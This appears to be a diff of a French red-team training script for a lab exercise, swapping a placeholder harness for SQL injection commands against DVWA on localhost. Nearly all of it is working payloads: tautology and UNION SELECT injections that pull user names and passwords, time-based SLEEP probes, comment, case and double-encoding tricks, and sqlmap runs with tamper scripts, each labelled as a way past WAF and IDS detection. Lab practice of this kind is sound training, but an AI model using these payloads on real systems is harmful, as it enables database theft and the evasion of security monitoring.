@@ -1,45 +1,100 @@
-#!/bin/bash
-# =============================================================================
-#  payloads.sh — Equipe 2 — Round 1 (Injection SQL)
-#
-#  Usage (apres avoir deploye les regles adverses) :
-#    bash attacks/equipe-2/payloads.sh <ip_dvwa>
-#
-#  Par defaut cible : dvwa (nom Docker)
-# =============================================================================
+# ==========================================
+# Red Team - Equipe 2
+# R1 - SQL Injection (tests manuels)
+# Objectif :
+# Tester la vulnérabilité DVWA et contourner
+# les mécanismes de détection (WAF / IDS)
+# ==========================================
 
-TARGET="${1:-dvwa}"
-PORT="80"
-COOKIE_FILE="/tmp/dvwa_eq2.txt"
 
-echo "=== Equipe 2 — Attaques R1 (Injection SQL) ==="
-echo "Cible : $TARGET:$PORT"
-echo ""
+# ------------------------------------------
+# 1. SQLi BASIQUE
+# Objectif : vérifier si l'application est vulnérable
+# ------------------------------------------
+curl "http://localhost:8080/vulnerabilities/sqli/?id=1' OR 1=1-- -&Submit=Submit"
 
-# Authentification DVWA
-curl -s -c "$COOKIE_FILE" \
-  -d "username=admin&password=password&Login=Login" \
-  "http://$TARGET:$PORT/login.php" -L -o /dev/null
-echo "[*] Cookie recupere"
-echo ""
 
-# ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
-echo "[1] Payload basique..."
-RESULT=$(curl -s -b "$COOKIE_FILE" \
-  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST1&Submit=Submit" \
-  -o /dev/null -w "%{http_code}")
-echo "    HTTP $RESULT"
+# ------------------------------------------
+# 2. VARIANTE AND
+# Objectif : contourner les règles ciblant OR
+# ------------------------------------------
+curl "http://localhost:8080/vulnerabilities/sqli/?id=1' AND 1=1-- -&Submit=Submit"
 
-# ── Payload 2 ───────────────────────────────────────────────────────────────
-echo "[2] Payload avance..."
-RESULT2=$(curl -s -b "$COOKIE_FILE" \
-  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST2&Submit=Submit" \
-  -o /dev/null -w "%{http_code}")
-echo "    HTTP $RESULT2"
 
-# ── Payload 3 ───────────────────────────────────────────────────────────────
-echo "[3] Payload evasion..."
-# A completer
+# ------------------------------------------
+# 3. OBFUSCATION AVEC COMMENTAIRES
+# Objectif : bypass filtres regex simples
+# Technique : remplacer les espaces par /**/
+# ------------------------------------------
+curl "http://localhost:8080/vulnerabilities/sqli/?id=1'/**/OR/**/1=1-- -&Submit=Submit"
 
-echo ""
-echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="
+
+# ------------------------------------------
+# 4. VARIATION DE CASSE
+# Objectif : contourner les filtres case-sensitive
+# ------------------------------------------
+curl "http://localhost:8080/vulnerabilities/sqli/?id=1' oR 1=1-- -&Submit=Submit"
+
+
+# ------------------------------------------
+# 5. ENCODAGE URL
+# Objectif : bypass IDS/WAF basiques
+# ------------------------------------------
+curl "http://localhost:8080/vulnerabilities/sqli/?id=1%27%20OR%201=1--%20-&Submit=Submit"
+
+
+# ------------------------------------------
+# 6. DOUBLE ENCODAGE
+# Objectif : contourner les systèmes naïfs
+# ------------------------------------------
+curl "http://localhost:8080/vulnerabilities/sqli/?id=1%2527%2520OR%25201=1--%2520-&Submit=Submit"
+
+
+# ------------------------------------------
+# 7. UNION SELECT (TEST STRUCTURE)
+# Objectif : identifier le nombre de colonnes
+# ------------------------------------------
+curl "http://localhost:8080/vulnerabilities/sqli/?id=1' UNION SELECT null,null-- -&Submit=Submit"
+
+
+# ------------------------------------------
+# 8. EXTRACTION UTILISATEURS
+# Objectif : récupérer user + password
+# ------------------------------------------
+curl "http://localhost:8080/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit"
+
+
+# ------------------------------------------
+# 9. INJECTION TIME-BASED (FURTIVE)
+# Objectif : bypass détection signature
+# Technique : retard de réponse serveur
+# ------------------------------------------
+curl "http://localhost:8080/vulnerabilities/sqli/?id=1' AND SLEEP(5)-- -&Submit=Submit"
+
+
+# ==========================================
+# AUTOMATISATION AVEC SQLMAP
+# ==========================================
+
+
+# ------------------------------------------
+# 10. SQLMAP BASIQUE
+# Objectif : détecter automatiquement SQLi
+# ------------------------------------------
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="security=low" \
+--dbs
+
+
+# ------------------------------------------
+# 11. SQLMAP AVANCÉ (BYPASS WAF)
+# Objectif : contourner IDS/WAF
+# Techniques utilisées :
+# - space2comment → remplace espaces
+# - randomcase → casse aléatoire
+# - charencode → encodage caractères
+# ------------------------------------------
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="security=low" \
+--tamper=space2comment,randomcase,charencode \
+--dbs
